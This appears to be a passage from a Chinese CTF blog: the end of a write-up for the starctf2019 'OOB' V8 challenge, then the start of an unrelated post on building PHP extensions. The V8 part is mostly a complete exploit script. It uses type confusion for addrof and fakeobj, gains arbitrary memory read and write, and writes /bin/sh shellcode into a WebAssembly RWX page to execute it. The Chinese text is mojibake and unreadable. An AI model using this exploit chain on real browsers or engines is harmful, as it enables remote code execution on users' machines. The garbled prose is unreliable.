<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode"   >
          <a href="#â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode" class="headerlink" title="â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode"></a>â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f();</span><br></pre></td></tr></table></div></figure>

<p>ç›´æ¥é€šè¿‡è¿™ä¸ªè°ƒç”¨å³å¯ã€‚</p>

        <h4 id="EXP"   >
          <a href="#EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">this</span>.float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">        <span class="comment">// this.u32 = new Uint32Array(this.buf);</span></span><br><span class="line">        <span class="comment">// this.bytes = new Uint8Array(this.buf);</span></span><br><span class="line">        <span class="built_in">this</span>.bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.float64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bigUint64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.bigUint64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.float64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mem = <span class="keyword">new</span> Memory()</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//è®¾ç½®å¯¹è±¡æ•°ç»„</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//å°†åŸæœ¬æ˜¯å¯¹è±¡çš„mapè¦†ç›–ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„map,ä¹‹åè¯»å–å°±ä¼šä»¥æµ®ç‚¹æ•°ç»„å¯¹è±¡çš„å½¢å¼è¯»å–</span></span><br><span class="line">    <span class="comment">//ä»å¯¹è±¡æ•°ç»„ä¸­è¯»å‡ºå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶æ•´ä¸ªå¯¹è±¡æ•°ç»„å·²ç»è¢«æ”¹æˆæµ®ç‚¹æ•°ç»„ï¼Œæ‰€ä»¥ä¼šä»¥æµ®ç‚¹æ•°æ•°ç»„å½¢å¼è¯»å–ï¼Œå¾—åˆ°è¯¥å¯¹è±¡çš„åœ°å€</span></span><br><span class="line">    <span class="comment">//æ­£å¸¸æƒ…å†µä»å¯¹è±¡æ•°ç»„ä¸­è¯»å–å¯¹è±¡ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä¸æ˜¯è¯¥å¯¹è±¡çš„åœ°å€ï¼Œä½†æ˜¯è½¬æ¢æˆæµ®ç‚¹æ•°ç»„å°±ä¼šè¯»å–åˆ°æˆå‘˜çš„åœ°å€ï¼Œè¿™å°±æ˜¯ç±»å‹æ··æ·†</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_array_map);<span class="comment">//é‡æ–°è®¾ç½®å›æ¥</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//è®¾ç½®æµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//å°†æµ®ç‚¹æ•°æ•°ç»„è½¬åŒ–ä¸ºå¯¹è±¡æ•°ç»„</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//è·å–è½¬åŒ–ä¹‹åçš„å¯¹è±¡æ•°ç»„ï¼Œå°±èƒ½å¾—åˆ°è¯¥fake_objï¼Œå…¶åœ°å€ä¸ºaddrï¼Œå¯¹è±¡ç±»å‹ä¸ºå­—å…¸å¯¹è±¡</span></span><br><span class="line">    float_array.oob(float_array_map);<span class="comment">//é‡æ–°è®¾ç½®å›æ¥</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png" alt="image-20220322194115446"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" >starctf2019/pwn-OOB at master Â· sixstars/starctf2019 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/10/PHP_PWN/">PHP_PWN</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-02-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™"   >
          <a href="#ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™" class="headerlink" title="ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™"></a>ä¸€ã€phpæ‹“å±•æ¨¡å—æ­å»ºå’Œç¼–å†™</h1>
      
        <h2 id="1-åˆ›å»ºæ¨¡å—æ¨¡æ¿"   >
          <a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ›å»ºæ¨¡å—æ¨¡æ¿" class="headerlink" title="1.åˆ›å»ºæ¨¡å—æ¨¡æ¿"></a>1.åˆ›å»ºæ¨¡å—æ¨¡æ¿</h2>
      <p>æ‰¾åˆ°phpæºç ç›®å½•</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120778.png" alt="image-20220210174644261"></p>
<p>ç„¶åä½¿ç”¨<code>ext_skel</code>åˆ›å»ºä¸€ä¸ªæ¨¡æ¿</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ç¼–è¯‘æ¨¡å—"   >
          <a href="#2-ç¼–è¯‘æ¨¡å—" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç¼–è¯‘æ¨¡å—" class="headerlink" title="2.ç¼–è¯‘æ¨¡å—"></a>2.ç¼–è¯‘æ¨¡å—</h2>
      <p>éšåè¿›è¡Œç¼–è¯‘ï¼Œè·³è½¬åˆ°åˆšåˆšç”Ÿæˆçš„æ¨¡å—æ–‡ä»¶å¤¹è·¯å¾„<code>/path_to_php_src/ext/helloworld</code>ï¼Œç„¶åç¼–è¯‘</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œéœ€è¦æŒ‡å®šä¸€ä¸‹<code>--with-php-config</code>ï¼Œé€‰æ‹©è‡ªå·±çš„<code>php-config</code>ï¼Œå½“ç„¶å¦‚æœæœ¬åœ°çš„ç¯å¢ƒå˜é‡binå‘½ä»¤ä¸‹ç›´æ¥æœ‰<code>php-config</code>ä¹Ÿä¸ç”¨æŒ‡å®šäº†ï¼Œéšå</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120756.png" alt="image-20220210175900511"></p>
<p>å…¶ä¸­<code>helloworld.c</code>å³ä¸ºåˆ›å»ºçš„æ¨¡æ¿ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ5.6ç‰ˆæœ¬çš„ç¼–è¯‘å®Œæˆåï¼Œä¸ç”Ÿæˆ.soæ¨¡å—æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ç‰¹æ€§ï¼Ÿ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span 